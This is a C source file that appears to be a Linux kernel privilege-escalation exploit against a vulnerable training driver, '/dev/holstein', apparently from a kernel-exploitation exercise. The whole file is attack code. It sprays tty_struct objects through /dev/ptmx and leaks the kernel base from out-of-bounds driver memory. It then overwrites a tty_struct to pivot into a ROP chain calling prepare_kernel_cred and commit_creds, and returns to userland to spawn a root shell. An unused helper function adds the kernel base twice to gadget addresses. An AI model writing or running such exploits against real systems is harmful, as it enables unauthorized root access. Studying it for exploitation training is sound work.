#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/msg.h>
#include <sys/shm.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/utsname.h>

typedef uint8_t u8;
typedef uint16_t u16;
typedef uint32_t u32;
typedef uint64_t u64;

typedef int8_t i8;
typedef int16_t i16;
typedef int32_t i32;
typedef int64_t i64;
#define ofs_tty_offset 0xc38880
#define spray_num 100

u64 kbase;
u64 g_buf;
void spawn_shell();
u64 user_cs, user_ss, user_rflags, user_sp;
#define prepare_kernel_cred (kbase + 0x74650)
#define commit_creds (kbase + 0x744b0)
#define pop_rdi_ret (kbase + 0x4767e0)
#define pop_rcx_ret (kbase + 0x4d52dc)
#define push_rdx_pop_rsp_pop2_ret (kbase + 0x3a478a)
#define mov_rdi_rax_rep_movsq_ret (kbase + 0x62707b)
#define swapgs_restore_regs_and_return_to_usermode (kbase + 0x800e26)
u64 user_rip = (u64)spawn_shell + 1;
char buf[0x500];
int global;
void spawn_shell() {
  puts("[+] returned to user land");
  uid_t uid = getuid();
  if (uid == 0) {
    printf("[+] got root (uid = %d)\n", uid);
  } else {
    printf("[!] failed to get root (uid: %d)\n", uid);
    exit(-1);
  }
  puts("[*] spawning shell");
  system("/bin/sh");
  exit(0);
}

void save_userland_state() {
  puts("[*] saving user land state");
  __asm__(".intel_syntax noprefix;"
          "mov user_cs, cs;"
          "mov user_ss, ss;"
          "mov user_sp, rsp;"
          "pushf;"
          "pop user_rflags;"
          ".att_syntax");
}

void open_kn() {
  global = open("/dev/holstein", O_RDWR);
  if (global < 0) {
    puts("[-] cuts");
    exit(-1);
  }
  puts("successfully opened");
}

void write_heap() {
  u64 *p = (u64 *)&buf;
  *p++ = pop_rdi_ret + kbase;
  *p++ = 0;
  *p++ = prepare_kernel_cred;
  *p++ = pop_rcx_ret + kbase;
  *p++ = 0;
  *p++ = mov_rdi_rax_rep_movsq_ret + kbase;
  *p++ = commit_creds;
  *p++ = pop_rcx_ret + kbase;
  *p++ = 0;
  *p++ = pop_rcx_ret + kbase;
  *p++ = push_rdx_pop_rsp_pop2_ret + kbase;
  *p++ = swapgs_restore_regs_and_return_to_usermode + kbase;
  *p++ = 0;
  *p++ = 0;
  *p++ = user_rip;
  *p++ = user_cs;
  *p++ = user_rflags;
  *p++ = user_sp;
  *p++ = user_ss;
  printf("swapgs: 0x%lx", kbase + swapgs_restore_regs_and_return_to_usermode);
  *(u64 *)&buf[0x418] = g_buf;
  printf("[+] overwriting tty_struct\n");
  write(global, buf, 0x450);
}
void read_dev() {
  read(global, buf, 0x500);
  kbase = *(u64 *)&buf[0x418] - ofs_tty_offset;
  g_buf = *(u64 *)&buf[0x438] - 0x438;
  printf("gbuf: 0x%lx\n", g_buf);
  printf("leaked kbase: 0x%lx\n", kbase);
}
int main() {
  save_userland_state();
  int spray[spray_num];
  for (int i = 0; i < spray_num / 2; i++) {
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (spray[i] < 0) {
      perror("cuts");
    }
  }
  open_kn();
  for (int i = spray_num / 2; i < spray_num; i++) {
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (spray[i] < 0) {
      perror("cuts");
    }
  }
  read_dev();
  printf("[*] crafting rop chain\n");
  u64 *chain = (u64 *)&buf;

  *chain++ = pop_rdi_ret;
  *chain++ = 0x0;
  *chain++ = prepare_kernel_cred;
  *chain++ = pop_rcx_ret;
  *chain++ = 0;
  *chain++ = mov_rdi_rax_rep_movsq_ret;
  *chain++ = commit_creds;
  *chain++ = pop_rcx_ret;
  *chain++ = 0;
  *chain++ = pop_rcx_ret;
  *chain++ = 0;
  *chain++ = pop_rcx_ret;
  *chain++ = push_rdx_pop_rsp_pop2_ret;
  *chain++ = swapgs_restore_regs_and_return_to_usermode;
  *chain++ = 0x0;
  *chain++ = 0x0;
  *chain++ = user_rip;
  *chain++ = user_cs;
  *chain++ = user_rflags;
  *chain++ = user_sp;
  *chain++ = user_ss;

  *(u64 *)&buf[0x418] = g_buf;
  printf("[*] overwriting tty_struct\n");
  write(global, buf, 0x420);

  for (int i = 0; i < spray_num; i++) {
    ioctl(spray[i], 0, g_buf - 0x10);
  }

  getchar();
  close(global);
  for (int i = 0; i < spray_num; i++)
    close(spray[i]);
}